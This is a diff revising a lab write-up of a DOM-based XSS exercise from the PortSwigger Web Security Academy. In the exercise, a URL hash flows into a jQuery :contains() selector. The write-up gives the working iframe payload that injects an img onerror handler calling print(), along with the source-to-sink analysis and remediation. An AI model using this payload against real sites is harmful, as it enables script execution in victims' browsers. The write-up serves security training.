@@ -42,33 +42,70 @@
 
 # Executive Summary
 
-A DOM-based Cross-Site Scripting (XSS) vulnerability was identified in this lab. Attacker-controlled input is obtained from the `hashchange` event via `window.location.hash` and passed to a jQuery selector specifically `section.blog-list h2:contains` which acts as a code execution sink.
+A DOM-based Cross-Site Scripting (XSS) vulnerability was identified in this lab. 
+Attacker-controlled input is obtained from `window.location.hash` and passed 
+directly into a jQuery selector through the `:contains()` expression.
 
-Since user-supplied values ​​are injected directly into the selector, an attacker can execute JavaScript code by manipulating the page's hash.
+The vulnerable code is triggered by the `hashchange` event whenever the URL 
+fragment changes. Because the attacker-controlled value is inserted directly 
+into the jQuery selector without appropriate validation, a crafted hash can 
+alter the selector and lead to JavaScript execution in the victim's browser.
+
+In this lab, the vulnerability was successfully exploited using an 
+`<iframe>` and an injected `<img>` element with an `onerror` event handler 
+that calls `print()`.
 
 ---
 
 # Objective
 
-The objective of this lab is to exploit a DOM-based XSS vulnerability caused by the unsafe flow of attacker-controlled data from `window.location.hash` (source) to `section.blog-list h2 : contains` (sink).
+The objective of this lab is to exploit a DOM-based XSS vulnerability caused 
+by the unsafe flow of attacker-controlled data from `window.location.hash` 
+(source) into a jQuery `$()` selector (sink).
+
+The vulnerability is triggered through the `hashchange` event, which causes 
+the client-side JavaScript to process the attacker-controlled hash value.
 
 ---
 
 # Vulnerability Overview
 
-A DOM-based XSS (Document Object Model-based Cross-Site Scripting) vulnerability is a type of security flaw that occurs entirely within the user's browser on the client side. It happens when JavaScript code takes data from an attacker-controllable source and passes it—unsanitized—to a dangerous function that executes code (a "sink").
-The vulnerability arises when three key elements are present in the page's code: the source, the data flow and processing, and the dangerous destination or sink In this lab, attacker-controlled input from `window.location.hash` was passed to the jQuery selector `section.blog-list h2 : contains` sink Without any purification.
+A DOM-based XSS (Document Object Model-based Cross-Site Scripting) 
+vulnerability occurs when client-side JavaScript takes attacker-controlled 
+data from a source and passes it unsafely to a dangerous DOM operation or 
+JavaScript API.
 
-This allowed the attacker, after reloading the lab page via an `<iframe>` element, to set an `onerror` event containing a `print()` call.
+In this lab, the attacker-controlled source is:
+
+```javascript
+window.location.hash
+```
+The value is processed using:
+and:
+
+```javascript
+decodeURIComponent(...)
+```
+The resulting value is then concatenated directly into a jQuery selector:
+
+```javascript
+$('section.blog-list h2:contains(' + 
+    decodeURIComponent(window.location.hash.slice(1)) + 
+')');
+```
+The vulnerability occurs because attacker-controlled data is incorporated into the selector without appropriate validation.
+The hashchange event causes this vulnerable code to execute whenever the URL fragment is changed.
 
 ---
 
+
 # Attack Requirements
 
-- A client-side JavaScript source controllable by the attacker, such as `widow.location.hash`.
-- A jQuery selector `section.blog-list h2 : contains` sink that allows attacker-controlled data to influence the URL of a link.
-- The absence of effective output encoding or sanitization between the source and the sink.
-
+- An attacker-controlled source: `window.location.hash`.
+- A vulnerable jQuery `$()` selector sink.
+- A `hashchange` event that causes the vulnerable code to execute when the hash changes.
+- A jQuery version/selector behavior that allows the crafted selector to be interpreted in a dangerous way.
+  
 ---
 
 # Environment & Scope
@@ -78,8 +115,8 @@ This allowed the attacker, after reloading the lab page via an `<iframe>` elemen
 | Target            | PortSwigger Web Security Academy lab |
 | HTTP Method       | GET |
 | Source            | `window.location.hash` |
-| Sink              | `section.blog-list h2 : contains` |
-| Injection Context | HTML Attribute Context |
+| Sink              | `jQuery `$()` selector` |
+| Injection Context | jQuery Selector Context |
 | Client            | Web Browser |
 
 ---
@@ -87,81 +124,158 @@ This allowed the attacker, after reloading the lab page via an `<iframe>` elemen
 # Methodology
 
 1. Open the vulnerable lab.
-2. Inspect the page source and client-side JavaScript.
+2. Inspect the client-side JavaScript.
 3. Identify `window.location.hash` as the attacker-controlled source.
-4. Trace the data flow to the jQuery selector `section.blog-list h2 : contains` sink.
-5. Open the exploit page.
-6. Reloading the page using the `<iframe>` element to satisfy the hash requirement.
-7. Add an `<img>` element with an `onerror` event that displays the print page.
-8. Verify execution by the appearance of the print page.
+4. Identify the `hashchange` event that triggers the vulnerable code.
+5. Trace the attacker-controlled value into the jQuery `$()` selector.
+6. Analyze how the value is processed by `slice(1)` and `decodeURIComponent()`.
+7. Test the selector using controlled hash values.
+8. Construct an exploit using an `<iframe>` to trigger the `hashchange` event.
+9. Inject an `<img>` element with an `onerror` handler calling `print()`.
+10. Verify successful JavaScript execution.
 
 ---
 
 # Discovery Process
 
-### Step 1 — Normal Input
+### Step 1 — Testing the URL Fragment
 
 ```text
 #mohamad
 ```
 
-The search term is passed to the `slice(1)` function which removes the first character and then to the jQuery selector.
+The value after the # is available through:
 
-### Step 2 — Reveal Add-ons
+```javascript
+window.location.hash
+```
+For example:
+
+window.location.hash
+→ #mohamad
+
+The application then removes the leading # using:
+
+```javascript
+window.location.hash.slice(1)
+```
+resulting in: mohamad
+
+
+### Step 2 — Testing the jQuery Selector
+
+I tested a value containing a closing parenthesis:
 
 ```text
 /#mohamad)
 ```
+The additional ) affected the structure of the generated jQuery :contains() selector and resulted in a jQuery syntax error.
+This confirmed that the attacker-controlled hash value was being inserted directly into the selector.
 
-I notice a syntax error appearing because the code adds a closing parenthesis on its own.
+### Step 3 — Triggering the Hashchange Event
 
-### Step 3 — Reload the page
+The exploit uses an `<iframe>` to load the vulnerable page with an empty 
+hash and then modifies the iframe URL after it loads.
 
 ```html
-<iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
+<iframe src="LAB-URL/#"
+        onload="this.src+='<img src=x onerror=print()>'">
 </iframe>
 ```
-Reloading the page to trigger the `hashchange` event, while adding a feature that displays the print view.
+Changing the iframe URL causes the URL fragment to change, which triggers the hashchange event and executes the vulnerable jQuery selector.
+The injected <img> element uses an invalid image source, causing the onerror event to execute:
+
+```html
+print()
+```
+The appearance of the print dialog confirms successful JavaScript execution.
 
 ---
 
 # Technical Analysis
 
-The application reads the query string through `window.location.hash` and passes the resulting value to jQuery selector `$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`.
-
-The generated HTML initially contains:
+The vulnerable client-side code is:
 
 ```javascript
-<script>
- $(window).on('hashchange', function(){
- var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
-   if (post) post.get(0).scrollIntoView();
-           });
- </script>
+$(window).on('hashchange', function() {
+    var post = $('section.blog-list h2:contains(' +
+        decodeURIComponent(window.location.hash.slice(1)) +
+    ')');
+
+    if (post) post.get(0).scrollIntoView();
+});
 ```
+The application reads the URL fragment using window.location.hash.
+The slice(1) operation removes the leading #, and decodeURIComponent() decodes the resulting value.
+The decoded value is then concatenated directly into a jQuery :contains() selector.
 
-### Before
+### Vulnerable JavaScript
 
-```html
-search:
-
+```javascript
 $(window).on('hashchange', function(){
- var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+    var post = $('section.blog-list h2:contains(' +
+        decodeURIComponent(window.location.hash.slice(1)) +
+    ')');
+
+    if (post) post.get(0).scrollIntoView();
+});
 ```
+The code registers a `hashchange` event handler. When the URL fragment 
+changes, the handler reads `window.location.hash`, removes the leading `#`, 
+decodes the value, and inserts it into the jQuery selector.
 
-The client-side JavaScript reads the `window.location.hash` parameter from the URL and assigns its value to the jQuery selector `$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) +  ')');` .
 
+### After Injection
 
-### After
+After modifying the URL fragment, the attacker-controlled value is processed
+by the vulnerable JavaScript code.
+
+For example, the exploit uses an iframe to load the vulnerable page and then
+changes its URL fragment:
 
 ```html
-search:
-
-$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + <iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
-</iframe>')');
+<iframe src="LAB-URL/#"
+        onload="this.src+='<img src=x onerror=print()>'">
+</iframe>
 ```
+When the iframe loads, its onload handler changes the URL fragment. This causes the hashchange event to fire and the vulnerable JavaScript code to execute again.
 
-After supplying Reloading the page to trigger the `hashchange` event, while adding a feature that displays the print view.
+The vulnerable code processes the fragment using:
+
+```javascript
+window.location.hash.slice(1)
+```
+and:
+
+```javascript
+decodeURIComponent(...)
+```
+The resulting value is then inserted into the jQuery selector:
+
+```javascript
+$('section.blog-list h2:contains(' +
+    decodeURIComponent(window.location.hash.slice(1)) +
+')');
+```
+The attacker-controlled value can therefore influence the structure of the jQuery selector.
+
+The injected HTML element is:
+
+```html
+<img src=x onerror=print()>
+```
+Because the image source x is invalid, the browser triggers the onerror event, which executes:
+
+```html
+print()
+```
+The appearance of the print dialog confirms successful JavaScript execution.
+
+``` Note:
+> The `<iframe>` is part of the exploit delivery mechanism. It is not
+> part of the vulnerable JavaScript code itself. Its purpose is to cause the
+> URL fragment to change and trigger the `hashchange` event.
+```
 
 ---
 
@@ -172,29 +286,38 @@ After supplying Reloading the page to trigger the `hashchange` event, while addi
 ```javascript
 window.location.hash
 ```
-The source is attacker-controlled because the attacker can modify the query string in the URL.
+The URL fragment is attacker-controlled.
 
-## Parameter
+## Data Processing
 
 ```javascript
-section.blog-list
+window.location.hash.slice(1)
 ```
+This removes the leading #
+The value is then passed through:
+
+```javascript
+decodeURIComponent(...)
+```
+to decode URL-encoded characters.
 
 ## Data Flow
 
 ```javascript
-$(window).on('hashchange', function(){
- var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+decodeURIComponent(window.location.hash.slice(1))
 ```
 
-The application extracts the attacker-controlled `section.blog-list` parameter from Reloading the page to trigger the `hashchange` event, while adding a feature that displays the print view.
+The resulting value is concatenated into the jQuery selector.
 
 ## Sink
 
 ```javascript
- $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+$('section.blog-list h2:contains(' +
+    decodeURIComponent(window.location.hash.slice(1)) +
+')');
 ```
-Since the URL simply removes the first character, decodes the string, and then appends a closing parenthesis, we can reload the page and add an event based attribute.
+
+The jQuery $() function processes the attacker-controlled value as part of a selector.
 
 ---
 
@@ -203,9 +326,8 @@ Since the URL simply removes the first character, decodes the string, and then a
 | Property | Value |
 |---|---|
 | Source | `window.location.hash` |
-| Parameter | `section.blog-list` |
-| Sink | `$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');` |
-| Injection Context | HTML Attribute Context  |
+| Sink | `jQuery `$()` selector` |
+| Injection Context | jQuery Selector Context  |
 | Encoding | None |
 | Reflection Type | DOM-based |
 | URL Scheme Validation | None |
@@ -219,21 +341,61 @@ Since the URL simply removes the first character, decodes the string, and then a
 ## Payload Used
 
 ```html
-<iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
+<iframe src="LAB-URL/#"
+        onload="this.src+='<img src=x onerror=print()>'">
 </iframe>
 
 ```
 
 ## Why This Payload Works
 
-The `<iframe>` element reloaded the page to trigger the `hashchange` event; we then added an `<img>` element with an `onerror` event handler that displays the print page.
+```html
+<iframe>
+```
+Loads the lab.
+
+```
+/#
+```
+Sets the page to start with a hash.
+
+```html
+onload
+```
+Executes after the iframe loads.
+
+```html
+this.src += ...
+```
+Changes the iframe's source, thereby changing the hash.
+
+```
+hashchange
+```
+Changing the hash triggers:
+
+```html
+$(window).on('hashchange', ...)
+<img src=x>
+```
+Creates an image with an invalid source.
+
+```html
+onerror=print()
+```
+When the image fails to load, the following executes:
+
+```html
+print()
+```
+This indicates the successful exploitation of the lab.
 
 ---
 
 # Exploitation Flow
 
 ```text
-Attacker
+Exploit Server
    │
    ▼
 iframe
@@ -276,19 +438,21 @@ print()
 $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
 ```
 
-## URL Parameter
+## URL Fragment
 
-```javascript
-section.blog-list
+```text
+https://LAB-ID/#mohamad
 ```
+The value after # is available through 'window.location.hash' after 'window.location.hash.slice(1)' the value becomes mohamad
 
 ---
 
 ## HTML After Injection
 
- ```javascript
-$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + <iframe src="URL/#" onload="this.src+='<img src=x onerror=print() "">
-</iframe>')');
+ ```html
+<iframe src="LAB-URL/#"
+        onload="this.src+='<img src=x onerror=print()>'">
+</iframe>
  ```
 
 The `<iframe>` element reloaded the page to trigger the `hashchange` event; we then added an `<img>` element with an `onerror` event handler that displays the print page.
@@ -310,20 +474,34 @@ View print page
 
 # Impact
 
-- Execute arbitrary JavaScript in the victim's browser context.
-- Modify page content and user-visible functionality.
-- Perform actions on behalf of the victim.
+### Demonstrated Impact
+
+- JavaScript execution in the victim's browser context.
+
+### Potential Impact
+
+Depending on the application and victim privileges, DOM XSS could
+potentially allow:
+
+- Manipulation of page content.
 - Phishing and UI manipulation.
-- Access sensitive data exposed to JavaScript.
-- Potential session compromise depending on the application's session management and cookie protections.
+- Performing actions in the victim's browser context.
+- Access to information available to JavaScript.
+- Potential account compromise in vulnerable scenarios.
   
 ---
 
 # Root Cause
 
-The root cause is the assignment of attacker-controlled URL data to the `section.blog-list` attribute without validating or restricting the allowed URL schemes.
+The root cause is the use of attacker-controlled data from
+`window.location.hash` directly inside a jQuery selector.
 
-The application should not allow dangerous schemes such as `javascript:` to reach the DOM.
+The application constructs the selector by concatenating the decoded
+hash value into the `:contains()` expression without safely validating
+or restricting the input.
+
+Because the vulnerable jQuery selector processes the attacker-controlled
+value in an unsafe manner, a crafted hash can lead to DOM XSS.
 
 ---
 
@@ -342,24 +520,25 @@ The application should not allow dangerous schemes such as `javascript:` to reac
 
 # Remediation
 
-- Validate the `returnPath` value before assigning it to `href`.
-- Allow only expected URL schemes such as `https:` and `http:` where appropriate.
-- Reject dangerous schemes such as `javascript:` and `data:`.
-- Prefer allowlisting known relative paths when the application only needs internal navigation.
-- Use safe URL handling and validate the destination before assigning it to `href`.
+- Avoid constructing jQuery selectors by concatenating untrusted input.
+- Validate and constrain values obtained from `window.location.hash`.
+- Use safe DOM APIs instead of dynamically constructing selectors from user-controlled data.
+- Upgrade outdated versions of jQuery to a currently supported version.
+- Apply appropriate input validation and sanitization where necessary.
 - Implement a restrictive Content Security Policy (CSP) as an additional defense layer.
-
   
 ---
 
 # Lessons Learned
 
 - DOM XSS can occur entirely on the client side.
-- `location.search` can act as an attacker-controlled source.
-- The `returnPath` parameter controlled the value assigned to the `href` attribute.
-- URL scheme validation is critical when user-controlled data is assigned to `href`.
-- The `javascript:` URI scheme can result in JavaScript execution when activated.
-- Source → Data Flow → Sink analysis is essential for identifying DOM-based XSS.
+- `window.location.hash` can be an attacker-controlled source.
+- `hashchange` can cause vulnerable client-side code to execute when the URL fragment changes.
+- jQuery selectors can become dangerous sinks when attacker-controlled data is concatenated into them.
+- `slice(1)` removes the `#` character from the hash before processing the value.
+- `decodeURIComponent()` decodes URL-encoded input before it reaches the selector.
+- Source → Data Flow → Sink analysis is essential when investigating DOM-based XSS.
+- Keeping client-side libraries such as jQuery updated is an important security measure.
   
 ---
 
@@ -376,7 +555,7 @@ The application should not allow dangerous schemes such as `javascript:` to reac
 
 ## Initial Page
 
-![Test](Screen-Shots/test-lab5.png)
+![Test](Screen-Shots/test-lab6.png)
 
 ...
 
@@ -394,14 +573,44 @@ The application should not allow dangerous schemes such as `javascript:` to reac
 
 # Execution Condition
 
-Unlike some DOM XSS vulnerabilities that execute automatically when the page is loaded, this vulnerability requires the victim to activate the manipulated link.
+The exploit relies on the `hashchange` event.
 
-The payload is stored in the `href` attribute of the Back link and executes when the browser navigates to the `javascript:` URI.
+When the victim loads the exploit page, the iframe initially loads the
+target page with a `#` fragment. The iframe's `onload` handler then
+changes its `src`, which changes the URL fragment.
+
+This triggers the vulnerable `hashchange` handler and causes the
+attacker-controlled value to reach the jQuery selector.
 
 ---
 
 # Conclusion
 
-This practical experiment demonstrated how a DOM-based XSS vulnerability can arise when attacker-controlled data is transferred from `location.search` to an insecure sink such as `.attr('href', ...)`.
+This practical experiment demonstrated how a DOM-based XSS vulnerability
+can arise when attacker-controlled data from `window.location.hash` is
+passed into a vulnerable jQuery selector.
 
-The key point here is that the success of exploiting an XSS vulnerability depends on identifying the injection context and tracing the data flow path from the source to the sink. In this case, we performed a direct injection (in the URL, since the href attribute accepts many types of URL schemes).
+The key lesson is that DOM XSS is not limited to obvious sinks such as
+`innerHTML` or event-handler attributes. Client-side libraries and
+selector APIs can also become dangerous when attacker-controlled data is
+inserted into them without appropriate validation.
+
+The exploitation chain was:
+
+```text
+window.location.hash
+        ↓
+ hashchange event
+        ↓
+     slice(1)
+        ↓
+decodeURIComponent()
+        ↓
+ jQuery selector
+        ↓
+   crafted HTML
+        ↓
+     onerror
+        ↓
+      print()
+```
